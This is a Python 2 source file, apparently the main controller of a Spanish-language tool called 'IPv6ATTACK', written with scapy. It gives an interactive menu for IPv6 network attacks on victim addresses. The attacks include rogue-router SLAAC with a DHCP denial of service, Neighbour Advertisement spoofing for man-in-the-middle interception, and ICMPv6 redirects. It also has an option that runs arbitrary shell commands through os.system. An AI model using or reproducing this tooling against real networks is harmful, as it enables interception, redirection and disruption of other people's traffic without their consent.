from scapy.all import *
import sys
import os
import time
import platform
sys.path.append(os.path.abspath("tools"))
from discover import *
from spoof import FAKE, redirect
import subprocess
import threading
#get_mac = raw_input("Introduce la mac del atacante: ")
#get_ipv6 = raw_input("Introduce la dir ipv6 del atacante: ")

""" CREAR THREAD PARA DHCP_DOS Y OTRO PARA RA"""

#intentar descubrir direcciones ipv6 mandando paquetes y a ver que responde



print "***********************"
print "* IPv6ATTACK V 1.0    *"
print "* Coded by R3BEL10N   *"
print "* rebelion@riseup.net *"
print "***********************\n\n"

linux_d = discover_linux()
windows_d = discover_windows()

if platform.system() == 'Linux':
	linux_d.ipv6_neigh()
elif platform.system() == 'Windows':
	windows_d.ipv6_neigh()
else: 
	print "[*] Plataforma no reconocida"



			
#introduce_ipv6()

snif = sniff6()		
fake = FAKE()
redir = redirect()
print "\nSLAAC --> FAKE ROUTER \nNA --> MITM (Neighbour Spoofing)\nexit --> Salir del programa\nhelp --> Muestra esta ayuda\nshow IPs --> Muestra las direcciones IP\nshell --> ejecuta comandos de sistema operativo\nICMPv6 redirect --> ataque ICMPv6 Redirect\npassive discovery --> descubrimiento pasivo de direcciones IPv6"

while True:
	intro = raw_input(">>")
	if intro == 'help':
		print "\nSLAAC --> FAKE ROUTER \nNA --> MITM (Neighbour Spoofing)\nexit --> Salir del programa\nhelp --> Muestra esta ayuda\nshow IPs --> Muestra las direcciones IP\nshell --> ejecuta comandos de sistema operativo\nICMPv6 redirect --> ataque ICMPv6 Redirect\npassive discovery --> descubrimiento pasivo de direcciones IPv6"

	elif intro == 'NA':
		direcciones = []
		router_dir = raw_input("Introducir direccion IPv6 router (exit cuando termine): ")
		DOS = raw_input("Quieres realizar ataque DoS? [y/N]: ")
		if DOS == "y":
			os.system('sysctl -w net.ipv6.conf.all.forwarding=0')	
		else:
			os.system('sysctl -w net.ipv6.conf.all.forwarding=1')	

		while True:
			p = raw_input("Introducir direccion IPv6 victima (exit cuando termine): ")
		#		router_dir = raw_input("Introducir direccion IPv6 router (exit cuando termine): ")
			if p == "exit":
				break
			direcciones.append(p)
		get_mac = raw_input("Introduce la mac del atacante: ")
		a = threading.Thread(target=fake.NA_router(get_mac, direcciones, router_dir))
		b = threading.Thread(target=fake.NA_victim(get_mac, direcciones,router_dir))
		a.start()
		b.start()
	elif intro == 'SLAAC' :
		subprocess.Popen(['xterm', '-e', 'python', 'tools/dhcp_dos.py'])
		router_dir = raw_input("Introducir direccion IPv6 router (exit cuando termine): ")
		DOS = raw_input("Quieres realizar ataque DoS? [y/N]: ")
		if DOS == "y":
			os.system('sysctl -w net.ipv6.conf.all.forwarding=0')	
		else:
			os.system('sysctl -w net.ipv6.conf.all.forwarding=1')	
		get_interface = raw_input("introducir interfaz: ")
		direcciones = []
		while True:
			p = raw_input("Introducir direccion IPv6 victima (exit cuando termine): ")
		#		router_dir = raw_input("Introducir direccion IPv6 router (exit cuando termine): ")
			if p == "exit":
				break
			direcciones.append(p)	
		get_mac = raw_input("Introduce la mac del atacante: ")
		#get_ipv6 = raw_input("Introduce la dir ipv6 del atacante: ")
		#get_prefix = raw_input("Introduce el prefijo de red IPv6: ")
		print "[*] Espere mientras se DOSea el DHCP"
		time.sleep(30)
		fake.router(direcciones, get_mac, router_dir, get_interface)
	elif intro == 'exit' :
		break
		exit()	
	elif intro == 'show IPs':
		if platform.system() == 'Linux':
			linux_d.ipv6_neigh()
		elif platform.system() == 'Windows':
			windows_d.ipv6_neigh()
		else: 
			print "[*] Plataforma no reconocida"
	elif intro == 'shell':
		command = raw_input("#:")
		os.system('%s' %command)			
	elif intro == 'ICMPv6 redirect':
		direcciones = []
		while True:
			p = raw_input("Introducir direccion IPv6 victima (exit cuando termine): ")
			if p == "exit":
				break
			direcciones.append(p)
		get_destination = raw_input("Direccion a la que redirigir: ")
		redir.icmp(direcciones,get_destination)	
	elif intro == "passive discovery":
		number = input("numero de paquetes a recibir: ")
		interfaz = raw_input("Introducir interfaz de red: ")
		snif.packets(20, interfaz)
	else:
		print "[*] No se reconoce el comando %s" %intro
		
